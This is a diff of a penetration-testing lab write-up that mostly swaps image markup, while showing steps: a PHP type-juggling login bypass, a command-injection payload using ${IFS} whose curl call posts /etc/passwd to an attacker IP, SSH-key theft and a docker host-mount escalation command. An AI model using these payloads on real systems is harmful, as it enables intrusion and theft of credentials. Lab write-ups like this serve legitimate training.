@@ -52,13 +52,13 @@ So there's a `.git` repository which we can download first.
 
 Port 80 hosts a corporate website:
 
-<figure><img src="../../../.gitbook/assets/image (3954).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3954).png>)
 
 If we click 'Get in touch', we are redirected to `develop.site/getintouch.php`. We can first add that to our `/etc/hosts` file and then enumerate further.
 
 The page reveals a simple Contact Form:
 
-<figure><img src="../../../.gitbook/assets/image (3148).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3148).png>)
 
 Nothing much there. I ran a `gobuster` scan on the website and also downloaded the `.git` repository. While the `gobuster` scan ran, I enumerated the logs of the repository. Here's the interesting output:
 
@@ -158,43 +158,41 @@ Lastly, we have `login.php` form, which uses the username concatenated with the 
 
 The `.git` repository seems to be for the service running on port 8080:
 
-<figure><img src="../../../.gitbook/assets/image (3937).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3937).png>)
 
 We can login with `lu191:240610708`, abusing the type juggling here and view the dashboard:
 
-<figure><img src="../../../.gitbook/assets/image (1190).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1190).png>)
 
 The Resources tab of the dashboard shows potential for RCE:
 
-<figure><img src="../../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(312).png>)
 
 So we know that this is probably still vulnerable to RCE, and it tells us when we are blocked.
 
-<figure><img src="../../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(308).png>)
 
 I tested different commands, and found that `curl` isn't blocked:
 
-<figure><img src="../../../.gitbook/assets/image (1175).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1175).png>)
 
 Commands like `bash` and `sh` are blocked, and so are 'space' characters, so it will be difficult to get a reverse shell through `curl`. However, we can use this to read the files on the system by sending POST requests to our listening port 80.
 
 To overcome the space character block, we can use `${IFS}`. Using this, we can send POST requests with file contents using the `-F` flag:
 
-{% code overflow="wrap" %}
 ```
 127.0.0.1;curl${IFS}-X${IFS}POST${IFS}-F${IFS}"file=@/etc/passwd"${IFS}http://192.168.45.191
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(294).png>)
 
 Using this method, I found that the user was `franz`. We can then attempt to read their private SSH key:
 
-<figure><img src="../../../.gitbook/assets/image (3964).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3964).png>)
 
 We can then `ssh` in:
 
-<figure><img src="../../../.gitbook/assets/image (1180).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1180).png>)
 
 ## Privilege Escalation
 
@@ -210,10 +208,8 @@ mysql        8.0.22    d4c3cafb11d5   2 years ago   545MB
 
 Just run this command from Hacktricks:
 
-{% code overflow="wrap" %}
 ```
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host d4c3cafb11d5 chroot /host/ bash
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (3941).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3941).png>)
